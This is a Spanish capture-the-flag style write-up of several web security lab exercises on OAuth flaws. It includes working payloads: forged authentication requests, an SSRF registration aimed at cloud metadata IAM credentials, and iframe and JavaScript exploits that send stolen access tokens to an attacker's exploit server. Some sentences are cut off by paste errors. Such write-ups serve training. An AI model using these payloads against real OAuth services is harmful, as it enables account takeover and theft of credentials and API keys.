## Reto 1: Omisión de autenticación mediante flujo implícito de OAuth

Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con sus cuentas de redes sociales. Una validación defectuosa por parte de la aplicación cliente permite que un atacante acceda a las cuentas de otros usuarios sin conocer su contraseña.

Para resolver el laboratorio, inicia sesión en la cuenta de Carlos. Su dirección de correo electrónico es carlos@carlos-montoya.net.

Puedes iniciar sesión con tu propia cuenta de redes sociales utilizando las siguientes credenciales: wiener:peter. 

ypass de autenticación mediante el uso indebido del flujo implícito de OAuth, donde el error se encuentra en cómo la aplicación cliente valida la identidad del usuario tras completar el proceso de autorización.

Durante el flujo OAuth, el usuario inicia sesión a través de un proveedor externo (por ejemplo, una red social), que devuelve al cliente un token junto con información básica del usuario autenticado. La aplicación cliente luego usa estos datos para autenticar internamente al usuario en su sistema.

Sin embargo, en este laboratorio, la validación es deficiente: la aplicación confía ciegamente en la dirección de correo enviada por el cliente en el cuerpo de la solicitud POST a /authenticate, sin comprobar que ese correo coincida con el asociado al token recibido del proveedor OAuth.

Este fallo permite que un atacante capture la solicitud de autenticación legítima (por ejemplo, como wiener@…), y la modifique cambiando el campo email por el de la víctima (carlos@carlos-montoya.net), mientras mantiene el token válido. Al reenviar esta solicitud, la aplicación interpreta erróneamente que el token pertenece a Carlos, y le otorga acceso sin necesidad de contraseña.

```
POST /authenticate HTTP/2
....
{"email":"carlos@carlos-montoya.net","username":"carlos","token":"5wLpBky0afdS7z3QryTCVA04P2YENFsHJjVyR0eK5UZ"}
```

## Reto 2: SSRF mediante registro dinámico de clientes OpenID

Este laboratorio permite que las aplicaciones cliente se registren dinámicamente con el servicio OAuth mediante un punto de conexión de registro específico. El servicio OAuth utiliza algunos datos específicos del cliente de forma insegura, lo que expone una posible vulnerabilidad a ataques SSRF.

Para resolver el laboratorio, diseñe un ataque SSRF para acceder http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/y robar la clave de acceso secreta para el entorno en la nube del proveedor de OAuth.

Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peter 

una vulnerabilidad de tipo Server-Side Request Forgery (SSRF) que se origina en una función legítima del estándar OpenID: el registro dinámico de clientes.

El servidor OAuth permite que nuevas aplicaciones cliente se registren automáticamente a través de un endpoint sin autenticación (/reg). Durante este proceso, el cliente puede proporcionar una propiedad opcional llamada logo_uri, que supuestamente contiene la URL del logo de la aplicación. Esta URL es posteriormente utilizada por el servidor para renderizar interfaces de autorización.

El fallo reside en que el servidor OAuth no valida adecuadamente la URL proporcionada en logo_uri, y realiza una petición directa a dicha URL cuando un usuario accede a la página de autorización (/client/CLIENT-ID/logo).

El atacante aprovecha esto para registrar una aplicación maliciosa con una logo_uri apuntando a una dirección IP reservada del proveedor cloud (169.254.169.254), que expone información sensible como las credenciales de IAM de la máquina.

Mediante este bypass, el atacante logra que el servidor realice una petición SSRF a:

http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
Posteriormente, tras acceder al logo asociado a su aplicación, el servidor le devuelve en la respuesta las claves de acceso del entorno cloud del proveedor.

```
{
	"redirect_uris": [
		"https://test.com"
	],
	"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
Cuando lo creamos obtenemos un client_id
```
"client_id_issued_at":1762417554,"client_id":"XV5D0NRdbzBI1NFxZBL5r",
```
Este client_id ponemos en el logo para que nos lo genere con ese identificador
```
GET /client/XV5D0NRdbzBI1NFxZBL5r/logo HTTP/2
```

## Reto 3: Vinculación forzada de perfiles OAuth


Este laboratorio te permite vincular un perfil de redes sociales a tu cuenta para iniciar sesión mediante OAuth en lugar de usar el nombre de usuario y la contraseña habituales. Debido a la implementación insegura del flujo OAuth por parte de la aplicación cliente, un atacante podría manipular esta funcionalidad para acceder a las cuentas de otros usuarios.

Para resolver el laboratorio, utilice un ataque CSRF para vincular su propio perfil de redes sociales a la cuenta del administrador en el sitio web del blog, luego acceda al panel de administración y elimine. carlos.

El usuario administrador abrirá cualquier cosa que envíes desde el servidor de exploits y siempre tendrá una sesión activa en el sitio web del blog.

Puedes iniciar sesión en tus propias cuentas utilizando las siguientes credenciales:

    Cuenta del sitio web del blog: wiener:peter
    Perfil en redes sociales: peter.wiener:hotdog

se estudia un ataque de Forced OAuth Profile Linking, donde el atacante aprovecha la falta de validación del parámetro state en el flujo OAuth para vincular su propia cuenta social a la sesión de otro usuario, en este caso, la cuenta del administrador.

El sitio web ofrece la posibilidad de enlazar un perfil social a una cuenta local ya existente, permitiendo así que el usuario pueda autenticarse mediante OAuth en el futuro. El problema es que esta vinculación no está protegida contra ataques CSRF: el endpoint ‘/oauth-linking?code=…‘ no valida si el código de autorización fue solicitado por el mismo usuario que va a asociar la cuenta.

El atacante completa el flujo de autorización con su propia cuenta social, pero intercepta y guarda el enlace final que contiene el código de autorización. Luego, construye un exploit HTML que contiene un iframe apuntando a dicho enlace, y lo envía al administrador mediante el exploit server. Como el administrador tiene una sesión activa en la web, su navegador realiza la petición al endpoint de vinculación, usando el código robado del atacante y asociando su cuenta social con la cuenta del administrador.

Posteriormente, el atacante simplemente inicia sesión usando su perfil social y accede directamente a la cuenta del administrador. Una vez dentro, puede acceder al panel de administración y eliminar al usuario carlos, completando así el laboratorio.

Esta es la solicitud que nos saltamos para que sea reciclada por el administrador cuando se lo enviemos al exploit Server.
```
GET /oauth-linking?code=QdZmjEY5fqV9XScTEfjfbDbHdF_z5gGaLL6xg-OVv9B HTTP/2
```

## Reto 4: Secuestro de cuentas OAuth mediante redirect_uri

Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con sus cuentas de redes sociales. Una mala configuración del proveedor de OAuth permite que un atacante robe los códigos de autorización asociados a las cuentas de otros usuarios.

Para resolver el laboratorio, roba un código de autorización asociado al usuario administrador, luego úsalo para acceder a su cuenta y eliminar al usuario. carlos.

El usuario administrador abrirá cualquier archivo que envíes desde el servidor de explotación y siempre tendrá una sesión activa con el servicio OAuth.

Puedes iniciar sesión con tu propia cuenta de redes sociales utilizando las siguientes credenciales: wiener:peter. 

Se analiza un ataque de secuestro de cuenta mediante OAuth, aprovechando una mala configuración del parámetro redirect_uri en el servidor de autorización. El objetivo es robar el código de autorización OAuth del administrador y utilizarlo para acceder a su cuenta en la aplicación cliente.

El atacante inicia sesión normalmente a través del proveedor OAuth y observa que el código de autorización (code) es enviado como parámetro en una redirección tras la autenticación. Sin embargo, nota que puede modificar el redirect_uri por cualquier dominio, y el servidor OAuth lo acepta sin validación alguna. Esto le permite redirigir el código de autorización hacia un servidor controlado por él, como el exploit server.

Con esto, el atacante construye un exploit que contiene un iframe apuntando a una petición OAuth con el redirect_uri alterado, de forma que el código de autorización del administrador será redirigido automáticamente a su servidor. Dado que el administrador tiene una sesión activa con el proveedor OAuth, el ataque se completa sin que la víctima tenga que hacer nada más que abrir el exploit.

```shell
GET /auth?client_id=gck4cpzw5llhlytssq7sv&redirect_uri=https://exploit-0ac3009b0321815580c02a1101680009.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

```

```

Una vez que el código robado aparece en los logs del exploit server, el atacante lo usa para completar manualmente el flujo de autenticación visitando la URL del callback de la aplicación con el código robado como parámetro. Esto hace que el sistema lo autentique como el administrador.

Ya con acceso a la cuenta del administrador, el atacante puede entrar al panel de administración y eliminar al usuario carlos, resolviendo así el laboratorio.


## Reto 5 : Robo de tokens de acceso OAuth mediante una redirección abierta

Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con su cuenta de redes sociales. La validación defectuosa del servicio OAuth permite que un atacante filtre tokens de acceso a páginas arbitrarias de la aplicación cliente.

Para resolver el laboratorio, identifica una redirección abierta en el sitio web del blog y úsala para robar un token de acceso a la cuenta del administrador. Usa el token de acceso para obtener la clave API del administrador y envía la solución mediante el botón que aparece en el banner del laboratorio. 

se estudia cómo una mala validación del parámetro redirect_uri por parte del servidor OAuth permite concatenar rutas como ‘/../‘ al callback legítimo, logrando una redirección hacia otros puntos dentro del mismo dominio. Al completar el login con OAuth, se observa que el access_token queda incluido en el fragmento de la URL.

Posteriormente, se analiza el comportamiento de la funcionalidad “Siguiente post”, la cual redirige al usuario a la URL indicada en un parámetro path. Se demuestra que este componente es una redirección abierta (open redirect) que permite enviar al usuario a cualquier dominio externo.

se encadena la redirección relativa (../) en el redirect_uri con la redirección abierta (/post/next?path=) para forzar que el flujo OAuth finalice en un servidor externo controlado por el atacante (exploit server).

Se construye un iframe malicioso que redirige al administrador (quien tiene sesión activa con el proveedor OAuth) a través del flujo de autenticación. El token de acceso resultante se incluye como fragmento (#access_token=…) en la URL de redirección final.

Mediante un pequeño script JavaScript en el exploit server, el fragmento es extraído y reenviado como parámetro de consulta (/?access_token=…), permitiendo su captura desde los logs del servidor.

```shell
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0aee0010040e838c82de228102910023.oauth-server.net/auth?client_id=frvc46eps87an0q38m1lr&redirect_uri=https://0a940067046083f5822a247a000e0027.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7100e004538320824c239e01c90063.exploit-server.net/exploit&response_type=token&nonce=1267774374&scope=openid%20profile%20email';
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

Con el token ya robado, se realiza una solicitud autenticada al endpoint /me del blog, obteniendo así la API key del administrador. Esta clave es enviada como solución para completar el laboratorio.

```shell
Authorization: Bearer tNH0OlglZFDHn3dvRQKYT_PCK8-ajs5pMV1k1Q5wXwZ
```
## Reto 10: Robo de tokens de acceso OAuth a través de una página proxy

Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con su cuenta de redes sociales. La validación defectuosa del servicio OAuth permite que un atacante filtre tokens de acceso a páginas arbitrarias de la aplicación cliente.

Para resolver el laboratorio, identifica una vulnerabilidad secundaria en la aplicación cliente y úsala como proxy para robar un token de acceso a la cuenta del administrador. Usa el token de acceso para obtener la clave API del administrador y envía la solución mediante el botón que aparece en el banner del laboratorio.

El usuario administrador abrirá cualquier cosa que envíes desde el servidor de explotación y siempre tendrá una sesión activa con el servicio OAuth.

Puedes iniciar sesión a través de tu cuenta de redes sociales utilizando las siguientes credenciales: wiener:peter. 

Comprueba que el siguiente sitio codigo esta bien

se revisa el flujo de autenticación OAuth desde Burp Suite. Se descubre que el parámetro redirect_uri admite rutas como ‘/../‘, lo que permite manipular la URL de redirección final, manteniéndola dentro del mismo dominio pero apuntando a rutas no previstas por el servidor. Aunque el dominio del redirect_uri está correctamente validado, esta técnica de path traversal permite eludir la restricción sin desencadenar errores.

se audita la aplicación en busca de rutas que puedan actuar como proxy o facilitar la fuga de información. Se analiza la página /post/comment/comment-form, la cual está embebida en las entradas del blog mediante un iframe.

Este formulario contiene un comportamiento inseguro: utiliza ‘window.postMessage()‘ para enviar la URL actual (window.location.href) al parent window, sin restringir el origen de destino (targetOrigin: ‘*’). Esto significa que cualquier página que lo cargue en un iframe podrá recibir esa información, incluida la fragmentación de la URL donde se encuentra el token de acceso.

se combina todo lo aprendido para construir un exploit completo. Se crea un iframe que inicia el flujo OAuth con el redirect_uri apuntando al formulario de comentarios vulnerable, el cual reflejará el token en su propiedad ‘location.href‘.

Debajo del iframe, se implementa un script que escucha eventos message desde el iframe, y envía los datos recibidos (incluyendo el token) como una petición al exploit server. Esto permite registrar en el access log el token de acceso del administrador.

Una vez recibido el token, se utiliza en el endpoint /me del blog para realizar una petición autenticada como el administrador. La respuesta devuelve los datos personales y la API key, la cual se emplea para resolver el laboratorio.

```shell
<script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
</script>
```


```
<iframe src="http://oauth-0a0700df0463cd2780181a8002b300b2.oauth-server.net/auth?client_id=aibl0gpx1gclbpboeuoil&redirect_uri=https://0a4a00530473cded80731c20003800cc.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-358102052&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data));
});

</script>
```


En los logs aparece en la propia url el token de acceso robado:
```
10.0.4.205      2025-11-09 09:36:39 +0000 "GET /https%3A%2F%2F0a4a00530473cded80731c20003800cc.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DR-3tQqT32ziryGTSIVkfrNxtZR5DGwxodmGlKqO2qu3%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```